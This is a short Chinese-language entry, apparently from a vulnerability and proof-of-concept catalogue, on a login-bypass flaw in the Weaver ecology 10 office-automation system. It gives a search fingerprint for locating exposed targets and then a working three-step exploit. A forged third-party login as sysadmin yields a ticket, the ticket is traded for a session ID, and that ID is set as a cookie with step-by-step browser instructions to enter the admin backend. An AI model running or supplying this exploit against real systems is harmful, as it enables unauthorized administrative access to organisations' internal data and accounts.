# 泛微-ecology-10-appThirdLogin-登录绕过漏洞

- **系统**：泛微OA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="/build/passport/static/js/lib.js"`
- **请求**：`POST /papi/passport/rest/appThirdLogin HTTP/1.1`

**请求体 / payload**
```
1、发送请求包，从响应里面提取serviceTicketId
Host:
Content-Type: application/x-www-form-urlencoded
username=sysadmin&service=1&ip=1&loginType=third
2、发送请求包，从响应里面提取data
POST /papi/passport/login/generateEteamsId HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
stTicket={serviceTicketId}
3、打开浏览器，带着cookie：ETEAMSID={data},访问/hrm/addressbook/department,访问登录后的页面,即可登入后台。
操作方法：火狐浏览器为例，f12打开 存储，找到左侧cookie栏，点击右上角的+号，名称那一格填写ETEAMSID，值那一格填写data的值，Domain那一列填写当前的域名。然后浏览器上方构造好url:http://xxxx/hrm/addressbook/department,按回车即可登入后台
```
- **预期**：200　|　—